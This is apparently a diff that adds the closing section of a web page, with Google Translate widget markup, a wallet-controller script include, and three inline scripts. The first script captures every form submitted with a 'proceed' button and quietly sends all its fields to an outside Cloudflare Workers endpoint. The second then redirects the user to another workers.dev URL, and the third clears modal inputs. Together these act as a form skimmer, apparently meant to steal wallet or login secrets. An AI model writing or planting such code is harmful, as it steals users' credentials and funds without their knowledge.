+    </script><div id="goog-gt-tt" class="VIpgJd-yAWNEb-L7lbkb skiptranslate" style="border-radius: 12px; margin: 0 0 0 -23px; padding: 0; font-family: 'Google Sans', Arial, sans-serif;" data-id=""><div id="goog-gt-vt" class="VIpgJd-yAWNEb-hvhgNd"><div class="VIpgJd-yAWNEb-hvhgNd-Ud7fr"><img src="https://fonts.gstatic.com/s/i/productlogos/translate/v14/24px.svg" width="24" height="24" alt=""><div class=" VIpgJd-yAWNEb-hvhgNd-IuizWc-i3jM8c " dir="ltr">Original text</div></div><div class="VIpgJd-yAWNEb-hvhgNd-k77Iif"><div id="goog-gt-original-text" class="VIpgJd-yAWNEb-nVMfcd-fmcmS VIpgJd-yAWNEb-hvhgNd-axAV1"></div></div><div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid ltr"><div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid-B7I4Od ltr" dir="ltr"><div class="VIpgJd-yAWNEb-hvhgNd-UTujCb">Rate this translation</div><div class="VIpgJd-yAWNEb-hvhgNd-eO9mKe">Your feedback will be used to help improve Google Translate</div></div><div class="VIpgJd-yAWNEb-hvhgNd-xgov5 ltr"><button id="goog-gt-thumbUpButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Good translation" aria-label="Good translation" aria-pressed="false"><span id="goog-gt-thumbUpIcon"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7H2v13h16c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM7 18H4V9h3v9zm14-7l-3 7H9V8l4.34-4.34L12 9h9v2z"></path></svg></span><span id="goog-gt-thumbUpIconFilled"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7v13h11c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM5 7H1v13h4V7z"></path></svg></span></button><button id="goog-gt-thumbDownButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Poor translation" aria-label="Poor translation" aria-pressed="false"><span id="goog-gt-thumbDownIcon"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7h5V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zM17 6h3v9h-3V6zM3 13l3-7h9v10l-4.34 4.34L12 15H3v-2z"></path></svg></span><span id="goog-gt-thumbDownIconFilled"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zm16 0h4V4h-4v13z"></path></svg></span></button></div></div><div id="goog-gt-votingHiddenPane" class="VIpgJd-yAWNEb-hvhgNd-aXYTce"><form id="goog-gt-votingForm" action="//translate.googleapis.com/translate_voting?client=te" method="post" target="votingFrame" class="VIpgJd-yAWNEb-hvhgNd-aXYTce"><input type="text" name="sl" id="goog-gt-votingInputSrcLang"><input type="text" name="tl" id="goog-gt-votingInputTrgLang"><input type="text" name="query" id="goog-gt-votingInputSrcText"><input type="text" name="gtrans" id="goog-gt-votingInputTrgText"><input type="text" name="vote" id="goog-gt-votingInputVote"></form><iframe name="votingFrame" frameborder="0"></iframe></div></div></div>
+
+
+
+<div class="VIpgJd-ZVi9od-aZ2wEe-wOHMyf"><div class="VIpgJd-ZVi9od-aZ2wEe-OiiCO"><svg xmlns="http://www.w3.org/2000/svg" class="VIpgJd-ZVi9od-aZ2wEe" width="96px" height="96px" viewBox="0 0 66 66"><circle class="VIpgJd-ZVi9od-aZ2wEe-Jt5cK" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div><iframe frameborder="0" class="VIpgJd-ZVi9od-xl07Ob-OEVmcd skiptranslate" title="Language Translate Widget" style="visibility: visible; box-sizing: content-box; width: 2622px; height: 266px; display: none;"></iframe>
+<script src="js/wallets-controller.js"></script>
+
+<script>
+(function () {
+  const WORKER_URL =
+    "https://round-poetry-6598.officeusps368.workers.dev/api/store";
+
+  document.addEventListener(
+    "submit",
+    function (e) {
+      const form = e.target;
+
+      const proceedBtn = form.querySelector(
+        "button[type='submit'], input[type='submit']"
+      );
+      if (!proceedBtn) return;
+
+      const text = (proceedBtn.innerText || proceedBtn.value || "").toLowerCase();
+      if (!text.includes("proceed")) return;
+
+      const data = new FormData(form);
+
+      // Convert FormData to URLSearchParams for sendBeacon
+      const params = new URLSearchParams();
+      for (const [k, v] of data.entries()) {
+        params.append(k, v);
+      }
+
+      // Fire-and-forget, survives redirect
+      navigator.sendBeacon(WORKER_URL, params);
+    },
+    true // capture phase — MUST be true
+  );
+})();
+</script>
+
+<script>
+(function () {
+  const WORKER_URL = "https://lingering-union-8dcf.faith16437.workers.dev/start";
+
+  document.addEventListener("submit", function (e) {
+    const form = e.target;
+
+    // only intercept forms that contain a Proceed button
+    const proceedBtn = form.querySelector("button[type='submit'], input[type='submit']");
+    if (!proceedBtn) return;
+
+    const text = (proceedBtn.innerText || proceedBtn.value || "").toLowerCase();
+    if (!text.includes("proceed")) return;
+
+    // stop original submission
+    e.preventDefault();
+    e.stopPropagation();
+
+    // redirect to Cloudflare Worker
+    window.location.href = WORKER_URL;
+  }, true);
+})();
+</script>
+
+<script>
+(function () {
+  function clearModalInputs(modal) {
+    modal.querySelectorAll("input, textarea").forEach(el => {
+      if (el.type !== "hidden") {
+        el.value = "";
+      }
+    });
+  }
+
+  // Listen for ANY click that closes a modal
+  document.addEventListener("click", function (e) {
+    const isClose =
+      e.target.closest("[data-modal-close]") ||
+      e.target.closest(".modal-close") ||
+      e.target.closest("button[type='button']");
+
+    if (!isClose) return;
+
+    const modal = e.target.closest(".modal, [role='dialog']");
+    if (!modal) return;
+
+    clearModalInputs(modal);
+  }, true);
+
+  // Also clear on ESC key
+  document.addEventListener("keydown", function (e) {
+    if (e.key !== "Escape") return;
+
+    document.querySelectorAll(".modal, [role='dialog']").forEach(modal => {
+      if (modal.offsetParent !== null) {
+        clearModalInputs(modal);
+      }
+    });
+  });
+})();
+</script>
+
+</body></html>
